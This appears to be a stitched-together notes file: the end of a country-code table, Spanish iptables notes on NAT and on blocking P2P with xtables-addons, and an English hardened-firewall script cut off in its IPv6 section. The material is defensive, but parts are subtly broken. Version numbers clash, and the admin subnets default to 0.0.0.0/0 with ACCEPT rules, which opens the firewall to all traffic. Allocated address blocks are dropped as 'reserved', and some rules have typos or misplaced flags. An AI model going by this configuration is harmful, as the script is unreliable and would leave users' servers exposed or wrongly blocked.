CAYMAN ISLANDS                                  KY      CYM     136
CENTRAL AFRICAN REPUBLIC                        CF      CAF     140
CHAD                                            TD      TCD     148
CHILE                                           CL      CHL     152
CHINA                                           CN      CHN     156
CHRISTMAS ISLAND                                CX      CXR     162
COCOS (KEELING) ISLANDS                         CC      CCK     166
COLOMBIA                                        CO      COL     170
COMOROS                                         KM      COM     174
CONGO, Democratic Republic of (was Zaire)       CD      COD     180
CONGO, Republic of                              CG      COG     178
COOK ISLANDS                                    CK      COK     184
COSTA RICA                                      CR      CRI     188
COTE D'IVOIRE                                   CI      CIV     384
CROATIA (local name: Hrvatska)                  HR      HRV     191
CUBA                                            CU      CUB     192
CYPRUS                                          CY      CYP     196
CZECH REPUBLIC                                  CZ      CZE     203
DENMARK                                         DK      DNK     208
DJIBOUTI                                        DJ      DJI     262
DOMINICA                                        DM      DMA     212
DOMINICAN REPUBLIC                              DO      DOM     214
ECUADOR                                         EC      ECU     218
EGYPT                                           EG      EGY     818
EL SALVADOR                                     SV      SLV     222
EQUATORIAL GUINEA                               GQ      GNQ     226
ERITREA                                         ER      ERI     232
ESTONIA                                         EE      EST     233
ETHIOPIA                                        ET      ETH     231
FALKLAND ISLANDS (MALVINAS)                     FK      FLK     238
FAROE ISLANDS                                   FO      FRO     234
FIJI                                            FJ      FJI     242
FINLAND                                         FI      FIN     246
FRANCE                                          FR      FRA     250
FRENCH GUIANA                                   GF      GUF     254
FRENCH POLYNESIA                                PF      PYF     258
FRENCH SOUTHERN TERRITORIES                     TF      ATF     260
GABON                                           GA      GAB     266
GAMBIA                                          GM      GMB     270
GEORGIA                                         GE      GEO     268
GERMANY                                         DE      DEU     276
GHANA                                           GH      GHA     288
GIBRALTAR                                       GI      GIB     292
GREECE                                          GR      GRC     300
GREENLAND                                       GL      GRL     304
GRENADA                                         GD      GRD     308
GUADELOUPE                                      GP      GLP     312
GUAM                                            GU      GUM     316
GUATEMALA                                       GT      GTM     320
GUINEA                                          GN      GIN     324
GUINEA-BISSAU                                   GW      GNB     624
GUYANA                                          GY      GUY     328
HAITI                                           HT      HTI     332
HEARD AND MC DONALD ISLANDS                     HM      HMD     334
HONDURAS                                        HN      HND     340
HONG KONG                                       HK      HKG     344
HUNGARY                                         HU      HUN     348
ICELAND                                         IS      ISL     352
INDIA                                           IN      IND     356
INDONESIA                                       ID      IDN     360
IRAN (ISLAMIC REPUBLIC OF)                      IR      IRN     364
IRAQ                                            IQ      IRQ     368
IRELAND                                         IE      IRL     372
ISRAEL                                          IL      ISR     376
ITALY                                           IT      ITA     380
JAMAICA                                         JM      JAM     388
JAPAN                                           JP      JPN     392
JORDAN                                          JO      JOR     400
KAZAKHSTAN                                      KZ      KAZ     398
KENYA                                           KE      KEN     404
KIRIBATI                                        KI      KIR     296
KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF          KP      PRK     408
KOREA, REPUBLIC OF                              KR      KOR     410
KUWAIT                                          KW      KWT     414
KYRGYZSTAN                                      KG      KGZ     417
LAO PEOPLE'S DEMOCRATIC REPUBLIC                LA      LAO     418
LATVIA                                          LV      LVA     428
LEBANON                                         LB      LBN     422
LESOTHO                                         LS      LSO     426
LIBERIA                                         LR      LBR     430
LIBYAN ARAB JAMAHIRIYA                          LY      LBY     434
LIECHTENSTEIN                                   LI      LIE     438
LITHUANIA                                       LT      LTU     440
LUXEMBOURG                                      LU      LUX     442
MACAU                                           MO      MAC     446
MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF      MK      MKD     807
MADAGASCAR                                      MG      MDG     450
MALAWI                                          MW      MWI     454
MALAYSIA                                        MY      MYS     458
MALDIVES                                        MV      MDV     462
MALI                                            ML      MLI     466
MALTA                                           MT      MLT     470
MARSHALL ISLANDS                                MH      MHL     584
MARTINIQUE                                      MQ      MTQ     474
MAURITANIA                                      MR      MRT     478
MAURITIUS                                       MU      MUS     480
MAYOTTE                                         YT      MYT     175
MEXICO                                          MX      MEX     484
MICRONESIA, FEDERATED STATES OF                 FM      FSM     583
MOLDOVA, REPUBLIC OF                            MD      MDA     498
MONACO                                          MC      MCO     492
MONGOLIA                                        MN      MNG     496
MONTSERRAT                                      MS      MSR     500
MOROCCO                                         MA      MAR     504
MOZAMBIQUE                                      MZ      MOZ     508
MYANMAR                                         MM      MMR     104
NAMIBIA                                         NA      NAM     516
NAURU                                           NR      NRU     520
NEPAL                                           NP      NPL     524
NETHERLANDS                                     NL      NLD     528
NETHERLANDS ANTILLES                            AN      ANT     530
NEW CALEDONIA                                   NC      NCL     540
NEW ZEALAND                                     NZ      NZL     554
NICARAGUA                                       NI      NIC     558
NIGER                                           NE      NER     562
NIGERIA                                         NG      NGA     566
NIUE                                            NU      NIU     570
NORFOLK ISLAND                                  NF      NFK     574
NORTHERN MARIANA ISLANDS                        MP      MNP     580
NORWAY                                          NO      NOR     578
OMAN                                            OM      OMN     512
PAKISTAN                                        PK      PAK     586
PALAU                                           PW      PLW     585
PALESTINIAN TERRITORY, Occupied                 PS      PSE     275
PANAMA                                          PA      PAN     591
PAPUA NEW GUINEA                                PG      PNG     598
PARAGUAY                                        PY      PRY     600
PERU                                            PE      PER     604
PHILIPPINES                                     PH      PHL     608
PITCAIRN                                        PN      PCN     612
POLAND                                          PL      POL     616
PORTUGAL                                        PT      PRT     620
PUERTO RICO                                     PR      PRI     630
QATAR                                           QA      QAT     634
REUNION                                         RE      REU     638
ROMANIA                                         RO      ROU     642
RUSSIAN FEDERATION                              RU      RUS     643
RWANDA                                          RW      RWA     646
SAINT HELENA                                    SH      SHN     654
SAINT KITTS AND NEVIS                           KN      KNA     659
SAINT LUCIA                                     LC      LCA     662
SAINT PIERRE AND MIQUELON                       PM      SPM     666
SAINT VINCENT AND THE GRENADINES                VC      VCT     670
SAMOA                                           WS      WSM     882
SAN MARINO                                      SM      SMR     674
SAO TOME AND PRINCIPE                           ST      STP     678
SAUDI ARABIA                                    SA      SAU     682
SENEGAL                                         SN      SEN     686
SERBIA AND MONTENEGRO                           CS      SCG     891
SEYCHELLES                                      SC      SYC     690
SIERRA LEONE                                    SL      SLE     694
SINGAPORE                                       SG      SGP     702
SLOVAKIA                                        SK      SVK     703
SLOVENIA                                        SI      SVN     705
SOLOMON ISLANDS                                 SB      SLB     090
SOMALIA                                         SO      SOM     706
SOUTH AFRICA                                    ZA      ZAF     710
SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS    GS      SGS     239
SPAIN                                           ES      ESP     724
SRI LANKA                                       LK      LKA     144
SUDAN                                           SD      SDN     736
SURINAME                                        SR      SUR     740
SVALBARD AND JAN MAYEN ISLANDS                  SJ      SJM     744
SWAZILAND                                       SZ      SWZ     748
SWEDEN                                          SE      SWE     752
SWITZERLAND                                     CH      CHE     756
SYRIAN ARAB REPUBLIC                            SY      SYR     760
TAIWAN                                          TW      TWN     158
TAJIKISTAN                                      TJ      TJK     762
TANZANIA, UNITED REPUBLIC OF                    TZ      TZA     834
THAILAND                                        TH      THA     764
TIMOR-LESTE                                     TL      TLS     626
TOGO                                            TG      TGO     768
TOKELAU                                         TK      TKL     772
TONGA                                           TO      TON     776
TRINIDAD AND TOBAGO                             TT      TTO     780
TUNISIA                                         TN      TUN     788
TURKEY                                          TR      TUR     792
TURKMENISTAN                                    TM      TKM     795
TURKS AND CAICOS ISLANDS                        TC      TCA     796
TUVALU                                          TV      TUV     798
UGANDA                                          UG      UGA     800
UKRAINE                                         UA      UKR     804
UNITED ARAB EMIRATES                            AE      ARE     784
UNITED KINGDOM                                  GB      GBR     826
UNITED STATES                                   US      USA     840
UNITED STATES MINOR OUTLYING ISLANDS            UM      UMI     581
URUGUAY                                         UY      URY     858
UZBEKISTAN                                      UZ      UZB     860
VANUATU                                         VU      VUT     548
VATICAN CITY STATE (HOLY SEE)                   VA      VAT     336
VENEZUELA                                       VE      VEN     862
VIET NAM                                        VN      VNM     704
VIRGIN ISLANDS (BRITISH)                        VG      VGB     092
VIRGIN ISLANDS (U.S.)                           VI      VIR     850
WALLIS AND FUTUNA ISLANDS                       WF      WLF     876
WESTERN SAHARA                                  EH      ESH     732
YEMEN                                           YE      YEM     887
ZAMBIA                                          ZM      ZMB     894
ZIMBABWE                                        ZW      ZWE     716


#### mostrar todas las cadenas de la tabla de filtro ####

iptables -t filter -L

#### mostrar todas las cadenas de la tabla nat ####

iptables -t nat -L

#### limpiar todas las reglas de la tabla de filtro ####

iptables -t filter -F

#### limpiar todas las reglas de la tabla nat ####

iptables -t nat -F

#### borrar cualquier cadena creada por el usuario ####

iptables -t filter -X

#### permitir las conexiones telnet entrantes ####

iptables -t filter -A INPUT -p TCP --dport telnet -j ACCEPT

#### bloquear las conexiones http salientes ####

iptables -t filter -A OUTPUT -p TCP --dport http -j DROP
 
#### permitir las conexiones POP a una cadena delantera ####

iptables -t filter -A FORWARD -p TCP --dport pop3 -j ACCEPT

#### registrando una cadena de entrada ####

iptables -t filter -A INPUT -j LOG --log-prefix "DROP INPUT"

#### configurar un pat (puerto de traduccion de direccion) en eth0, ocultando los paquetes de salida forzada. ####

iptables -t nat -A postrouting -o eth0 -j MASQUERADE

#### redireccionar los paquetes diriguidos de un host a otro ####

iptables -t nat -A PREROUTING -d 192.168.0.1 -p TCP -m TCP --dport 22 -j DNAT --to-destination 10.0.0.2:22


#### notas ####

#### redireccionar trafico con iptables ####

iptables -t nat -A PREROUTING -p TCP --destination-port 80 -j REDIRECT --to-port 10000


#### iptable xtables-addons modulo ipp2p module plugin

Un problema habitual para los administradores de redes es el abuso del uso de P2P. Si tenemos un servidor linux, podemos filtrar este tipo de trafico con el fin de pararlo, o, al menos, relentizarlo de forma que no merezca la pena. ####

Una forma de hacerlo es usando "xtables-addons" ####

xtables-addons contiene extensiones que no fueron aceptadas o aun no han sido aceptadas en los paquetes del kernel o iptables. Una de ellas es el modulo ipp2p (xt_ipp2p) que nos permite filtrar el trafico p2p. ####

Como en Debian Lenny, a dia de hoy, aun no tenemos la version 1.4.3 de iptables, y es la version minima para trabajar con xtables, me he descargado el codigo fuente y lo he compilado. Pero veamos paso por paso lo que he hecho.

#### Primero, descargamos iptables-1.4.3.tar.bz2 y xtables-addons-1.21.tar.bz2. ####

#### Luego copiamos los archivos descargados a /usr/src: ####

# cp iptables-1.5.3.tar.bz2 /usr/src
# cp xtables-addons-1.21.tar.bz2 /usr/src

#### Y los descomprimimos: ####

# cd /usr/src
# tar xfvj iptables-1.5.3.tar.bz2
# tar xfvj xtables-addons-1.21.tar.bz2

#### Se nos crearan dos directorios: ####

    * iptables-1.5.3
    * xtables-addons-1.21

#### Como es necesario tener los headers correspondientes al nucleo que tenemos instalado, los instalamos: ####

# aptitude install linux-headers-`uname -r`

#### Primero compilaremos e instalaremos iptables. Para ello, entramos en el directorio iptables-1.5.3: ####

# cd iptables-1.5.3

# ./configure

#### Si tuvieramos algun error, es cuestion de ver que es lo que nos falta. Si todo va bien, no tendremos ningun error y podremos compilar. ####

# make

#### Y, si el proceso de compilacion no nos ha devuelto ningun error, instalamos: ####

# make install

#### Una vez instalado iptables, podemos ver si esta funcionando si ejecutamos en un terminal: ####

# iptables --version

#### Una vez instalado iptables, vamos a instalar xtables-addons. Para ello, entramos en el directorio xtables-addons-1.21: ####

# cd xtables-addons-1.21

#### Y ejecutamos: ####

# ./configure

#### Si tuvieramos algun error, como ya dijimos al instalar iptables, es cuestion de ver que es lo que nos falta. Si todo va bien, no tendremos ningun error y podremos compilar: ####

# make

#### Y, si el proceso de compilacion no nos ha devuelto ningun error, instalamos: ####

# make install

#### Una vez instalado xtables-addons, podemos comprobar si todo ha ido bien de la siguiente manera: ####

# iptables -m ipp2p --help   - Obtendremos una ayuda acerca de como usar ipp2p con iptables.

#### Como podemos ver, podremos filtrar: ####

--edk [TCP,UDP] All known eDonkey/eMule/Overnet packets
--dc [TCP] All known Direct Connect packets
--kazaa [TCP,UDP] All known KaZaA packets
--gnu [TCP,UDP] All known Gnutella packets
--bit [TCP,UDP] All known BitTorrent packets
--apple [TCP] All known AppleJuice packets
--winmx [TCP] All known WinMX
--soul [TCP] All known SoulSeek
--ares [TCP] All known Ares

#### Ahora ya podriamos usar en iptables reglas que bloqueen los diferentes tipos de trafico. Ejemplos: ####

iptables -A FORWARD -p TCP -m ipp2p --edk -j DROP
iptables -A FORWARD -p UDP -m ipp2p --edk -j DROP
iptables -A FORWARD -p TCP -m ipp2p --dc -j DROP
iptables -A FORWARD -p TCP -m ipp2p --kazaa -j DROP
iptables -A FORWARD -p UDP -m ipp2p --kazaa -j DROP
iptables -A FORWARD -p TCP -m ipp2p --gnu -j DROP
iptables -A FORWARD -p UDP -m ipp2p --gnu -j DROP
iptables -A FORWARD -p TCP -m ipp2p --bit -j DROP
iptables -A FORWARD -p UDP -m ipp2p --bit -j DROP
iptables -A FORWARD -p TCP -m ipp2p --apple -j DROP
iptables -A FORWARD -p TCP -m ipp2p --winmx -j DROP
iptables -A FORWARD -p TCP -m ipp2p --soul -j DROP
iptables -A FORWARD -p TCP -m ipp2p --ares -j DROP


#### Strong firewall configuration for Linux with blacklist / blocklist auto update ####

	
Strong firewall configuration for Linux with blacklist / blocklist auto update

For me, this guide and scripts have been a work in progress and at its current iteration, version 2.6.1, it has features that I’ve tested, features I’ve modified due to causing issues with hosted services, and the newest feature that I’ve just begun testing, the blocklist via ipset. The ipset tool is great, allows you to make lists of IPv4 or IPv6 addresses and work with them in iptables or another program.
This started as a way for me to maintain a safe hosting environment and operate a hardened server. Turns out many firewall configurations don’t enable egress filtering, mine does. This is actually a massive security improvement and the value cannot be overstated.
If you are running Ubuntu like me, this is basically written for you. There are a couple commands and some configuration locations that are Ubuntu specific, to anyone running something else, you will have to figure out how to change the install and scripting process to meet your needs on your own. Best wishes and best of luck!

Let’s get to the details.
IPTables Config

File: iptablesconfv261.sh 

# Jim McKibben
# 2014-11-16
# Version 2.6.1
# IPTables Firewall configuration script
# Ingress and Egress filtering
# Allows HTTP, HTTPS, SSH, SMTP, NTP
# SSH Port easy customization
# Allows Local Loopback
# Allows specific ICMP
# Allows DNS Query and Response
# Blocks bad source
# Blocks non local Loopback
# DOS Protection and reporting
# DOS SYN Flood
# DOS ICMP
# DOS HTTP - needs work
# DOS SSH
# Logging
# Admin IP / Monitoring Section
# IPv6 support
# IPSet enabled Blocklist Support

#!/bin/sh
IPT=/sbin/iptables
IP6T=/sbin/ip6tables
ADMIN="0.0.0.0."
ADMINSUBNET01="0.0.0.0/0"
ADMINSUBNET02="0.0.0.0/0"
ADMINSUBNET03="0.0.0.0/0"
ADMINV6="::1"
ADMINSUBNETV601="::1"
SSHPORT="22"

echo "Enabling Firewall"

# IPv4 rules

# Specialty IPs
# These IPs will be allowed to ping
# They won't have to worry about DDoS rulesets
$IPT -N ADMIN_IP
#$IPT -A ADMIN_IP -p tcp -m multiport --sports $SSHPORT,25,80,443,10050,10051 -j ACCEPT
#$IPT -A ADMIN_IP -p tcp -m multiport --dports $SSHPORT,25,80,443,10050,10051 -j ACCEPT
#$IPT -A ADMIN_IP -i eth0 -p icmp --icmp-type destination-unreachable -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IPT -A ADMIN_IP -i eth0 -p icmp --icmp-type time-exceeded -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IPT -A ADMIN_IP -i eth0 -p icmp --icmp-type echo-reply -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IPT -A ADMIN_IP -i eth0 -p icmp --icmp-type echo-request -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IPT -A ADMIN_IP -i eth0 -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix "iptables: PING-DROP: "
#$IPT -A ADMIN_IP -i eth0 -p icmp -j DROP

# DUMP
$IPT -N DUMP > /dev/null
$IPT -F DUMP
$IPT -A DUMP -p tcp -j LOG --log-prefix "iptables: tcp: "
$IPT -A DUMP -p udp -j LOG --log-prefix "iptables: udp: "
$IPT -A DUMP -p tcp -j REJECT --reject-with tcp-reset
$IPT -A DUMP -p udp -j REJECT --reject-with icmp-port-unreachable
$IPT -A DUMP -j DROP

# Blocking excessive syn packet
$IPT -N SYN_FLOOD
$IPT -A INPUT -p tcp --syn -j SYN_FLOOD
$IPT -A SYN_FLOOD -m limit --limit 1/s --limit-burst 3 -j RETURN
$IPT -A SYN_FLOOD -j DROP

# Stateful table
#$IPT -N STATEFUL > /dev/null
#$IPT -F STATEFUL
#$IPT -I STATEFUL -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
#$IPT -A STATEFUL -m conntrack --ctstate NEW -i !eth0 -j ACCEPT
#$IPT -A STATEFUL -j DUMP

# Loopback rules
$IPT -A INPUT -i lo -j ACCEPT
$IPT -A INPUT -i !lo -d 127.0.0.0/8 -j REJECT
$IPT -A OUTPUT -o lo -j ACCEPT
$IPT -A OUTPUT -o !lo -d 127.0.0.0/8 -j REJECT

# Admin IPs
$IPT -A INPUT -s $ADMIN -j ACCEPT
$IPT -A OUTPUT -d $ADMIN -j ACCEPT
$IPT -A INPUT -s $ADMINSUBNET01 -j ACCEPT
$IPT -A OUTPUT -s $ADMINSUBNET01 -j ACCEPT
$IPT -A INPUT -s $ADMINSUBNET02 -j ACCEPT
$IPT -A OUTPUT -s $ADMINSUBNET02 -j ACCEPT

# IPSET Input Blocklist
$IPT -A INPUT -m set --match-set blacklist src -j LOG --log-prefix "IP Blacklist: "
$IPT -A INPUT -m set --match-set blacklist src -j REJECT --reject-with icmp-port-unreachable

# IPSET Output Blocklist
$IPT -A OUTPUT -m set --match-set blacklist dst -j LOG --log-prefix "IP Blacklist: "
$IPT -A OUTPUT -m set --match-set blacklist dst -j REJECT --reject-with icmp-port-unreachable

# Block
# drop reserved addresses incoming (these are reserved addresses)
# but may change soon
$IPT -A INPUT -i eth0 -s 0.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 1.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 2.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 5.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 7.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 10.0.0.0/8 -j DUMP
# Mostly US Commercial IP space, Google Fiber, and Business ISPs
#$IPT -A INPUT -i eth0 -s 23.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 27.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 31.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 36.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 39.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 41.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 42.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 58.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 59.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 60.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 127.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 169.254.0.0/16 -j DUMP
$IPT -A INPUT -i eth0 -s 172.16.0.0/12 -j DUMP
$IPT -A INPUT -i eth0 -s 192.168.0.0/16 -j DUMP
$IPT -A INPUT -i eth0 -s 197.0.0.0/8 -j DUMP
$IPT -A INPUT -i eth0 -s 224.0.0.0/3 -j DUMP
$IPT -A INPUT -i eth0 -s 240.0.0.0/8 -j DUMP

# drop reserved addresses incoming (these are reserved addresses)
# but may change soon
$IPT -A OUTPUT -o eth0 -d 0.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 1.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 2.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 5.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 7.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 10.0.0.0/8 -j DUMP
# Mostly US Commercial IP space, Google Fiber, and Business ISPs
#$IPT -A OUTPUT -o eth0 -d 23.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 27.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 31.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 36.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 39.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 41.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 42.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 58.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 59.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 60.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 127.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 169.254.0.0/16 -j DUMP
$IPT -A OUTPUT -o eth0 -d 172.16.0.0/12 -j DUMP
$IPT -A OUTPUT -o eth0 -d 192.168.0.0/16 -j DUMP
$IPT -A OUTPUT -o eth0 -d 197.0.0.0/8 -j DUMP
$IPT -A OUTPUT -o eth0 -d 224.0.0.0/3 -j DUMP
$IPT -A OUTPUT -o eth0 -d 240.0.0.0/8 -j DUMP

# Allow certain inbound ICMP types (ping, traceroute..)
$IPT -A INPUT -i eth0 -p icmp --icmp-type destination-unreachable -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IPT -A INPUT -i eth0 -p icmp --icmp-type time-exceeded -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IPT -A INPUT -i eth0 -p icmp --icmp-type echo-reply -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IPT -A INPUT -i eth0 -p icmp --icmp-type echo-request -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IPT -A INPUT -i eth0 -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix "iptables: PING-DROP: "
$IPT -A INPUT -i eth0 -p icmp -j DROP

# Drop all packets to port 111 except those from localhost
$IPT -A INPUT ! -s 127.0.0.0/8 -p tcp --dport 111 -j REJECT --reject-with tcp-reset

# kill off identd quick 
$IPT -A INPUT -i eth0 -p tcp --dport 113 -j REJECT --reject-with tcp-reset

# Allow all established, related in
#$IPT -A INPUT -i eth0 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allows Inbound NEW DOS SSH Attack prevention (only 4 attempts by an IP every 3 minutes, drop the rest)
# The ACCEPT at the end is necessary or, it wouldn't accept any connection
$IPT -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -m recent --set --name DEFAULT --rsource
$IPT -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -m recent --update --seconds 180 --hitcount 4 --name DEFAULT --rsource -j LOG -m limit --limit 20/m --log-prefix "iptables: SSH Attempt on port $SSHPORT : "
$IPT -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -m recent --update --seconds 180 --hitcount 4 --name DEFAULT --rsource -j REJECT
$IPT -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -j ACCEPT

# Inbound ESTABLISHED SSH (out is in Multi-out)
$IPT -A INPUT -i eth0 -p tcp --dport $SSHPORT -m conntrack --ctstate ESTABLISHED -j ACCEPT

# DOS HTTP Attack prevention
# Need re-evaluation, the current rates do not allow for WordPress image upload features
# Plus, the timings reportedly slows down current site browsing to an unusable level - hence the commented out "DROP"
$IPT -A INPUT -i eth0 -p tcp --dport 80 -m limit --limit 45/minute --limit-burst 300 -j ACCEPT
$IPT -A INPUT -i eth0 -p tcp --dport 80 -m hashlimit --hashlimit-upto 80/min --hashlimit-burst 800 --hashlimit-mode srcip --hashlimit-name http -j ACCEPT
#$IPT -A INPUT -i eth0 -p tcp --dport 80 -j DROP
$IPT -A INPUT -i eth0 -p tcp --dport 443 -m limit --limit 45/minute --limit-burst 300 -j ACCEPT
$IPT -A INPUT -i eth0 -p tcp --dport 443 -m hashlimit --hashlimit-upto 80/min --hashlimit-burst 800 --hashlimit-mode srcip --hashlimit-name https -j ACCEPT
#$IPT -A INPUT -i eth0 -p tcp --dport 443 -j DROP

# Allow Ping from Outside to Inside
$IPT -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT

# Multi-out for inbound SSH, HTTP, and HTTPS
$IPT -A OUTPUT -o eth0 -p tcp -m multiport --sports $SSHPORT,80,443 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Outbound SSH
$IPT -A INPUT -i eth0 -p tcp --sport $SSHPORT  -m conntrack --ctstate ESTABLISHED -j ACCEPT
$IPT -A OUTPUT -o eth0 -p tcp --dport $SSHPORT  -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Allow inbound DNS
#$IPT -A INPUT -i eth0 -p udp --sport 1024:65535 --dport 53 -j ACCEPT
#$IPT -A OUTPUT -p udp --sport 53 --dport 1024:65535 -j ACCEPT

# Allow outbound DNS
$IPT -A INPUT -i eth0 -p udp --dport 1024:65535 --sport 53 -j ACCEPT
$IPT -A OUTPUT -p udp --dport 53 --sport 1024:65535 -j ACCEPT

# Outbound HTTP, and HTTPS
$IPT -A OUTPUT -o eth0 -p tcp --dport 80 --sport 1024:65535 -j ACCEPT
$IPT -A INPUT -i eth0 -p tcp --dport 1024:65535 --sport 80 -j ACCEPT
$IPT -A OUTPUT -o eth0 -p tcp --dport 443 --sport 1024:65535 -j ACCEPT
$IPT -A INPUT -i eth0 -p tcp --dport 1024:65535 --sport 443 -j ACCEPT

# Inbound SMTP
#$IPT -A INPUT -i eth0 -p tcp --sport 1024:65535 --dport 25 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
#$IPT -A OUPUT -o eth0 -p tcp --sport 25 --dport 1024:65535 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Outbound SMTP
#$IPT -A INPUT -i eth0 -p tcp --sport 25 --dport 1024:65535 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
#$IPT -A OUTPUT -o eth0 -p tcp --sport 1024:65535 --dport 25 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Allow rsync from a specific network
#$IPT -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
#$IPT -A OUTPUT -o eth0 -p tcp --sport 873 -m conntrack --ctstate ESTABLISHED -j ACCEPT

# Allow SVN
#$IPT -A INPUT -i eth0 -p tcp --dport 3690 --sport 1024:65535 -j ACCEPT
#$IPT -A OUTPUT -o eth0 -p tcp --sport 3690 --dport 1024:65535 -j ACCEPT
#$IPT -A INPUT -i eth0 -p tcp --dport 3667 --sport 1024:65535 -j ACCEPT
#$IPT -A OUTPUT -o eth0 -p tcp --sport 3667 --dport 1024:65535 -j ACCEPT

# Allow all related
#$IPT -A OUTPUT -o eth0 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Don't log route packets coming from routers - too much logging
$IPT -A INPUT -i eth0 -p udp --dport 520 -j REJECT

# Don't log smb/windows sharing packets - too much logging
$IPT -A INPUT -i eth0 -p tcp --dport 137:139 -j REJECT
$IPT -A INPUT -i eth0 -p udp --dport 137:139 -j REJECT

# All policies set to DROP
$IPT --policy INPUT DROP
$IPT --policy OUTPUT DROP
$IPT --policy FORWARD DROP
#$IPT --policy ADMIN_IP DROP

# IPv6 rules

# Specialty IPs
# These IPs will be allowed to ping
# They won't have to worry about DDoS rulesets
$IP6T -N ADMIN_IP
#$IP6T -A ADMIN_IP -p tcp -m multiport --sports $SSHPORT,25,80,443,10050,10051 -j ACCEPT
#$IP6T -A ADMIN_IP -p tcp -m multiport --dports $SSHPORT,25,80,443,10050,10051 -j ACCEPT
#$IP6T -A ADMIN_IP -i eth0 -p icmp --icmp-type destination-unreachable -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IP6T -A ADMIN_IP -i eth0 -p icmp --icmp-type time-exceeded -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IP6T -A ADMIN_IP -i eth0 -p icmp --icmp-type echo-reply -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IP6T -A ADMIN_IP -i eth0 -p icmp --icmp-type echo-request -m limit --limit  1/s --limit-burst 1 -j ACCEPT
#$IP6T -A ADMIN_IP -i eth0 -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix "iptables: PING-DROP: "
#$IP6T -A ADMIN_IP -i eth0 -p icmp -j DROP

# DUMP
$IP6T -N DUMP > /dev/null
$IP6T -F DUMP
$IP6T -A DUMP -p tcp -j LOG --log-prefix "ip6tables: tcp: "
$IP6T -A DUMP -p udp -j LOG --log-prefix "ip6tables: udp: "
$IP6T -A DUMP -p tcp -j REJECT --reject-with tcp-reset
$IP6T -A DUMP -p udp -j REJECT --reject-with icmp-port-unreachable
$IP6T -A DUMP -j DROP

# Add Admin IPs to INPUT Chain
#$IP6T -A INPUT -s $ADMINV6 -j ADMIN_IP
#$IP6T -A OUTPUT -d $ADMINV6 -j ADMIN_IP

# Blocking excessive syn packet
$IP6T -N SYN_FLOOD
$IP6T -A INPUT -p tcp --syn -j SYN_FLOOD
$IP6T -A SYN_FLOOD -m limit --limit 1/s --limit-burst 3 -j RETURN
$IP6T -A SYN_FLOOD -j DROP

# Stateful table
#$IP6T -N STATEFUL > /dev/null
#$IP6T -F STATEFUL
#$IP6T -I STATEFUL -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
#$IP6T -A STATEFUL -m conntrack --ctstate NEW -i !eth0 -j ACCEPT
